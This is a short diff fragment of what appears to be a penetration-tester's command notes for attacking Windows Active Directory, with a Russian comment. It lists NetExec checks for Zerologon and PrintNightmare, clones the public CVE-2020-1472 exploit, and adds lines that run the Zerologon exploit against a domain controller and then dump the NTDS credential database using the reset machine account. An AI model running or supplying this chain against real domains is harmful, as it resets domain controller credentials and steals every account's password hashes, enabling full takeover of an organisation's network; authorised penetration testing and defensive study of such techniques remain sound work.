@@ -93,6 +93,9 @@
 		
 		nxc smb dc1.corp.com -u '' -p '' -M zerologon	(git clone https://github.com/dirkjanm/CVE-2020-1472 -q)
 
+			---proxychains4 -q python3 cve-2020-1472-exploit.py dc01 172.16.10.3 
+			---nxc smb 172.16.10.3 -u 'DC01$' -p '' --ntds
+		
 		nxc smb dc1.corp.com -u '' -p '' -M printnightmare
 
 		(скрипт проверки найтмор)	/printnightmare -check dc.com.com/user\@termit-win(хост) -no-pass -k 		
